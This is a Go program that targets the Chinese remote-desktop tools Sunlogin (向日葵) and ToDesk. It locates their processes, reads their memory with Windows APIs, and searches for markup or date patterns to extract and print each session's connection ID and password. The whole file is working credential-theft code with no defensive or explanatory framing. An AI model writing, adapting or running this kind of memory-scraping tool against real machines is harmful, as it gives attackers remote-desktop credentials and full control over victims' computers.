package main

import (
	"fmt"
	"regexp"
	"strconv"
	"strings"
	"time"
	"unsafe"

	"github.com/shirou/gopsutil/v3/process"
	"golang.org/x/sys/windows"
)

// 定义常量
const (
	PROCESS_VM_READ           = 0x0010
	PROCESS_QUERY_INFORMATION = 0x0400
)

// 打开进程以获取句柄
func openProcess(pid int32) (windows.Handle, error) {
	handle, err := windows.OpenProcess(PROCESS_VM_READ|PROCESS_QUERY_INFORMATION, false, uint32(pid))
	if err != nil {
		//	return 0, fmt.Errorf("failed to open process: %v", err)
	}
	return handle, nil
}

// 读取进程内存
func readMemory(handle windows.Handle, address uintptr, size uint32) ([]byte, error) {
	buffer := make([]byte, size)
	var bytesRead uintptr
	err := windows.ReadProcessMemory(handle, address, &buffer[0], uintptr(size), &bytesRead)
	if err != nil {
		//	return nil, fmt.Errorf("failed to read memory: %v", err)
	}
	return buffer, nil
}

// 搜索进程内存中的字节模式
func searchMemory(handle windows.Handle, pattern []byte) ([]uintptr, error) {
	var results []uintptr
	var memoryInfo windows.MemoryBasicInformation

	address := uintptr(0)
	for {
		err := windows.VirtualQueryEx(handle, address, &memoryInfo, unsafe.Sizeof(memoryInfo))
		if err != nil || memoryInfo.RegionSize == 0 {
			break
		}

		if memoryInfo.State == windows.MEM_COMMIT && (memoryInfo.Protect&windows.PAGE_READWRITE) != 0 {
			data, err := readMemory(handle, memoryInfo.BaseAddress, uint32(memoryInfo.RegionSize))
			if err == nil {
				for i := 0; i < len(data)-len(pattern); i++ {
					if matchPattern(data[i:i+len(pattern)], pattern) {
						results = append(results, memoryInfo.BaseAddress+uintptr(i))
					}
				}
			}
		}
		address = memoryInfo.BaseAddress + uintptr(memoryInfo.RegionSize)
	}

	return results, nil
}

// 检查字节序列是否匹配
func matchPattern(data, pattern []byte) bool {
	for i := range pattern {
		if data[i] != pattern[i] {
			return false
		}
	}
	return true
}

// 提取两个字符串之间的文本
func extractBetween(value, startDelim, endDelim string) string {
	start := strings.Index(value, startDelim)
	if start == -1 {
		return ""
	}
	start += len(startDelim)

	end := strings.Index(value[start:], endDelim)
	if end == -1 {
		return ""
	}

	return value[start : start+end]
}

// 检查字符串是否为数字
func isNumeric(s string) bool {
	_, err := strconv.Atoi(strings.TrimSpace(s))
	return err == nil
}

// 根据进程名称检查进程是否存在并获取所有匹配的 PID
func getPIDsByName(name string) ([]int32, error) {
	processes, err := process.Processes()
	if err != nil {
		return nil, fmt.Errorf("failed to get processes: %v", err)
	}

	var pids []int32
	for _, proc := range processes {
		procName, err := proc.Name()
		if err != nil {
			continue
		}

		if strings.EqualFold(procName, name) {
			pids = append(pids, proc.Pid)
		}
	}

	if len(pids) == 0 {
		return nil, nil
	}

	return pids, nil
}

// 检查进程是否存在
func isProcessExist(name string) (bool, []int32) {
	pids, err := getPIDsByName(name)
	if err != nil {
		//	log.Printf("Error while checking processes: %v\n", err)
		return false, nil
	}

	if len(pids) == 0 {
		//fmt.Printf("Process '%s' does not exist.\n", name)
		return false, nil
	}

	///fmt.Printf("Process '%s' exists with PIDs: %v\n", name, pids)
	return true, pids
}

// 提取日期并格式化为所需的字符串
func getCurrentDateString() string {
	return time.Now().Format("20060102")
}

// 扫描向日葵进程
func xiangrikui(IDArray []int32) {
	for _, PID := range IDArray {
		handle, err := openProcess(PID)
		if err != nil {
			fmt.Println(err)
			continue
		}
		defer windows.CloseHandle(handle)

		// 搜索 "<f f=yahei.28 c=color.fastcode >" 模式的字节
		pattern := []byte("<f f=yahei.28 c=color_edit >")
		IDs, err := searchMemory(handle, pattern)
		if err != nil {
			fmt.Println("搜索失败:", err)
			continue
		}

		if len(IDs) >= 17 {
			for _, id := range IDs {
				data, err := readMemory(handle, id, 900)
				if err != nil {
					fmt.Printf("读取内存失败: %v\n", err)
					continue
				}

				remoteCode := extractBetween(string(data), ">", "</f>")
				if isNumeric(strings.ReplaceAll(remoteCode, " ", "")) {
					fmt.Println("id:", remoteCode)
					break
				}
			}
		}

		passwordPattern := []byte("<f f=yahei.28 c=color_edit >")
		passwordArray, err := searchMemory(handle, passwordPattern)
		if err != nil {
			fmt.Println("搜索密码失败:", err)
			continue
		}

		if len(passwordArray) >= 9 {
			for _, addr := range passwordArray {
				data, err := readMemory(handle, addr, 900)
				if err != nil {
					fmt.Printf("读取内存失败: %v\n", err)
					continue
				}

				password := extractBetween(string(data), ">", "</f>")
				if len(password) == 6 {
					fmt.Println("password:", password)
					break
				}
			}
		}

		windows.CloseHandle(handle)
	}
}

// 扫描ToDesk进程
func todesk(IDArray []int32) {
	currentDate := getCurrentDateString()
	pattern := []byte(currentDate)

	for _, PID := range IDArray {
		handle, err := openProcess(PID)
		if err != nil {
			fmt.Println(err)
			continue
		}
		defer windows.CloseHandle(handle)

		IDs, err := searchMemory(handle, pattern)
		if err != nil {
			fmt.Println("搜索失败:", err)
			continue
		}

		for _, id := range IDs {
			startAddress := id - 250
			if startAddress < 0 {
				startAddress = 0
			}
			data, err := readMemory(handle, startAddress, 300)
			if err != nil {
				fmt.Printf("读取内存失败: %v\n", err)
				continue
			}

			dataStr := string(data)

			numberPattern := regexp.MustCompile(`\b\d{9}\b`)
			number := numberPattern.FindString(dataStr)
			if number != "" {
				//fmt.Printf("在地址 %x 的上下文中找到的第一个9位纯数字: %s\n", id, number)
				fmt.Println("id", number)
			}

			alphanumPattern := regexp.MustCompile(`\b[a-z0-9]{8}\b`)
			alphanum := alphanumPattern.FindString(dataStr)
			if alphanum != "" {
				//fmt.Printf("在地址 %x 的上下文中找到的第一个8位小写字母+数字: %s\n", id, alphanum)
				fmt.Println("password", alphanum)
				break
			}
		}

		windows.CloseHandle(handle)
	}
}

func main() {
	// 检查向日葵进程
	exists, pids := isProcessExist("SunloginClient.exe")
	if exists {
		//fmt.Printf("向日葵存在: %v\n", pids)
		fmt.Println("向日葵存在:")
		xiangrikui(pids)
	}

	// 检查ToDesk进程
	exists, pids = isProcessExist("ToDesk.exe")
	if exists {
		//fmt.Printf("ToDesk存在: %v\n", pids)
		fmt.Println("todesk存在:")
		todesk(pids)
	}
}
